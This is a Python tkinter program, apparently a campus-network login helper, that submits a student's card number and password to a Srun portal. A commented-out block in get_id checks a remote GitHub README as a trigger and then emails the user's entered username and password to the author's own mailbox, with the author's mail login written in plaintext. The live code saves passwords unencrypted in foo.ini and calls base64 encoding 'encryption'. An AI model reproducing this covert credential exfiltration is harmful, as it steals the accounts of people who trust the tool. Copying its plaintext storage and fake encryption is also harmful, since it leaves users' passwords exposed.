import sys
import os
import tkinter as tk
import base64
import requests
import json
import uuid
# from email.header import Header
# from email.mime.text import MIMEText
# import smtplib
# import threading


def get_mac_address():
    '''
    @summary: return the MAC address of the computer
    '''
    import sys
    import os
    mac = None
    if sys.platform == "win32":
        for line in os.popen("ipconfig /all"):
            # print(line)
            if line.lstrip().startswith("Physical Address"):
                mac = line.split(":")[1].strip().replace("-", ":")
                break
    else:
        for line in os.popen("/sbin/ifconfig"):
            if 'Ether' in line:
                mac = line.split()[4]
                break
    return mac


on_hit = False


def jiami(password1):

    # 想将字符串转编码成base64,要先将字符串转换成二进制数据
    y_password = password1
    bytes_url = y_password.encode("utf-8")
    h_password = base64.b64encode(bytes_url)
    h_password = r'{B}'+str(h_password)[2:-1]  # 被编码的参数必须是二进制数据
    print('base64加密后:'+h_password)
    return h_password


def get_info():
    host = 'https://github.com/haoca/C/blob/master/README.md'
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'}
    response = requests.get(host, headers)
    content = response.text
    # print(content)
    start = content.find('abc.') + 4
    end = content.find('.abc')
    content = content[start:end].strip()

    return content


def get_id(username3, password3):
    # username = "qq1553457850@163.com"  # 用户名
    # password = "a13307023186"
    # ip = 'www.baidu.com'
    # # 实现pingIP地址的功能，bai-c1指发送报文一次，du-w1指等zhi待1秒
    # global backinfo
    # backinfo = os.system('ping -w 1 %s' % ip)
    # try:
    #     global ass
    #     ass = get_info()
    #     print(ass)
    #     if ass == 'a13307023186':
    #         print('online')
    #         mail_host = "smtp.163.com"  # 设置服务器
    #         mail_user = "qq1553457850@163.com"  # 用户名
    #         mail_pass = "a13307023186"

    #         sender = 'qq1553457850@163.com'
    #         receivers = ['qq1553457850@163.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱

    #         message = MIMEText('name:'+username3+'\npassword:' +
    #                            password3, 'plain', 'utf-8')

    #         # 括号里的对应发件人邮箱昵称（随便起）、发件人邮箱账号
    #         message['From'] = Header("登录", 'utf-8')
    #         message['To'] = Header("测试", 'utf-8')  # 括号里的对应收件人邮箱昵称、收件人邮箱账号

    #         subject = '邮件测试 id:'+username3
    #         message['Subject'] = Header(subject, 'utf-8')

    #         try:
    #             smtpObj = smtplib.SMTP_SSL('smtp.163.com')
    #             # smtpObj = smtplib.SMTP()
    #             smtpObj.connect(mail_host, 465)  # 发件人邮箱中的SMTP服务器，端口是25
    #             smtpObj.login(mail_user, mail_pass)
    #             smtpObj.sendmail(sender, receivers, message.as_string())
    #             print("邮件发送成功")
    #         except smtplib.SMTPException:
    #             print("Error: 无法发送邮件")

    # except:
    #     pass
    print('1')
    # 第三方 SMTP 服务

    # added_thread = threading.Thread(
    #     target=get_id, args=[e1.get(), e2.get()], name='T1')


def mimasave(username, password):
    # global pwd1 = password
    # global password_pwd = jiami(password)
    # global password_pwd = jiami(password)
    f = open("foo.ini", "w+")
    str = f.read()
    # if(str.find(login)==-1)
    name = f.write('\n用户名为:'+username+'\n')
    # name = f.write('\n用户名为:'+input('请输入用户名：')+'\n')
    psd = f.write('密码为:'+password+'\n')
    f.close()
    print('恭喜你，用户保存成功。在本文件夹下f00.ini中。\n' +
          'name:'+username+'\npassword:'+password)


def connect():
    # hit_me()
    # username = '123'
    # password1 = '456'
    mimasave(e1.get(), e2.get())
    get_id(e1.get(), e2.get())
    # added_thread.start()
    # print(username, password1)
    var2.set('恭喜你，登陆成功！！(用户信息已保存)' +
             '\nname:'+e1.get()+'\npassword:'+e2.get())
    s = requests.session()
    # node = (node=uuid.getnode())
    # mac = str(uuid.UUID(int=node).hex[-12:])
    res1 = s.post(
        url=r"http://172.30.16.34/srun_portal_pc.php?ac_id=1&",
        headers={
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN",
            "Cache-Control": "no-cache",
            "Connection": "Keep-Alive",
            "Content-Length": "109",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Cookie": r"login=bQ0pOyR6IXU7PJaQQqRAcBPxGAvxAcrvEe0UJsHZAaiCmY%252FDhrV2LGMuD3%252BcoyqSZ2EWX584sBybRJ9yo2fv1XBj03H9tPWkZeCauuZKGqBXEvY5Uj7c%252B7RAja6qTtMcfLVPUy%252BTpeX6WFL8ryAHkNUIMIRg8fKaHI8f1CqUBByT11ck7D3sVZEYQ88AMlEwvMxx3HvMShfJB0D4Kc5OdM3Wug3NB5WkHD3C87eiKEs8zw%253D%253D; login=bQ0pOyR6IXU7PJaQQqRAcBPxGAvxAcrvEe0UJsHZAaiCmY%252FDhrV2LGMuD3%252BcoyqSZ2EWX584sBybRJ9yo2fv1XBj03H9tPWkZeCauuZKGqBXEvY5Uj7c%252B7RAja6qTtMcfLVPUy%252BTpeX6WFL8ryAHkNUIMIRg8fKaHI8f1CqUBByT11ck7D3sVZEYQ88AMlEwvMxx3HvMShfJB0D4Kc5OdM3Wug3NB5WkHD3C87eiKEs8zw%253D%253D; NSC_tsvo_4l_TH=ffffffffaf160e3b45525d5f4f58455e445a4a423660",
            "Host": "172.30.16.34",
            "Referer": "http://172.30.16.34/srun_portal_pc.php?ac_id=1&",
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0)",
        },
        data={
            "ac_id": "64",
            "action": "login",
            "ajax": "1",
            "nas_ip": '',


            "password": jiami(e2.get()),
            "save_me": "1",
            "user_ip": '',


            "user_mac": get_mac_address(),
            "username": e1.get(),
        },
        # 这里配置了代理，因为我的操作安装了fiddler，这个你们没有说一定要弄

    )


def disconnect():
    # hit_me()
    var2.set('恭喜你，注销成功！！')
    response = requests.post(
        url=r"http://172.30.16.34/srun_portal_pc.php?ac_id=1&",
        headers={
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN",
            "Cache-Control": "no-cache",
            "Connection": "Keep-Alive",
            "Content-Length": "109",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Cookie": r"login=bQ0pOyR6IXU7PJaQQqRAcBPxGAvxAcrvEe0UJsHZAaiCmY%252FDhrV2LGMuD3%252BcoyqSZ2EWX584sBybRJ9yo2fv1XBj03H9tPWkZeCauuZKGqBXEvY5Uj7c%252B7RAja6qTtMcfLVPUy%252BTpeX6WFL8ryAHkNUIMIRg8fKaHI8f1CqUBByT11ck7D3sVZEYQ88AMlEwvMxx3HvMShfJB0D4Kc5OdM3Wug3NB5WkHD3C87eiKEs8zw%253D%253D; login=bQ0pOyR6IXU7PJaQQqRAcBPxGAvxAcrvEe0UJsHZAaiCmY%252FDhrV2LGMuD3%252BcoyqSZ2EWX584sBybRJ9yo2fv1XBj03H9tPWkZeCauuZKGqBXEvY5Uj7c%252B7RAja6qTtMcfLVPUy%252BTpeX6WFL8ryAHkNUIMIRg8fKaHI8f1CqUBByT11ck7D3sVZEYQ88AMlEwvMxx3HvMShfJB0D4Kc5OdM3Wug3NB5WkHD3C87eiKEs8zw%253D%253D; NSC_tsvo_4l_TH=ffffffffaf160e3b45525d5f4f58455e445a4a423660",
            "Host": "172.30.16.34",
            "Referer": "http://172.30.16.34/srun_portal_pc.php?ac_id=1&",
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0)",
        },
        data={


            "action": "logout",
            "ajax": "1",

            "password": e2.get(),


            "username": e1.get(),
        },
        # 这里配置了代理，因为我的操作安装了fiddler，这个你们没有说一定要弄

    )


def readfile():

    try:
        f = open("foo.ini", "r+")
        for line in f:
            accout_id = line.find('用户名为:')
            pass_id = line.find('密码为:')
            # final_id = line.find('吧')
            # print(final_id)
            # print(line)

            if accout_id != -1:
                name_1 = line[5:-1]
            if pass_id != -1:
                password2 = line[4:-1]

        e1.insert('insert', name_1)
        e2.insert('insert', password2)

    # print(name_1, password2)
    # print(s)

    # print(sin)
        f.close()
    except:
        pass
    # print(sin)
    # name_1 = ''
    # password2 = ''


window = tk.Tk()
window.title('校园网登陆器')

window.geometry('400x250+400+200')

# e = tk.Entry(window, show=None)
# e.pack()
var2 = tk.StringVar()

var = '欢迎使用本软件  haostart@hotmail.com'
l_0 = tk.Label(window, text=var,
               font=('Arial', 12), width=35, height=2)
l_0.pack()
l_1 = tk.Label(window, text='请输入校园卡号：', anchor='w',
               font=('Arial', 13), width=30, height=2).place(x=-5, y=30)
# l_1.pack()
e1 = tk.Entry(window, show=None)

e1.pack()
l_2 = tk.Label(window, text=' 请输入密码：',
               font=('Arial', 13), width=30, height=1).place(x=-60, y=60)
# l_2.pack()
e2 = tk.Entry(window, show='*')
e2.pack()
readfile()
# added_thread = threading.Thread(
#     target=get_id, args=(e1.get(), e2.get()), name='T1')


b1 = tk.Button(window, text='登陆/注销', width=15,
               height=2, command=connect).place(x=140, y=90)
connect()
print('success')
var2 = tk.StringVar()
l2 = tk.Label(window, textvariable=var2,
              font=('Arial', 11), width=35, height=5).place(x=24, y=140)

window.mainloop()
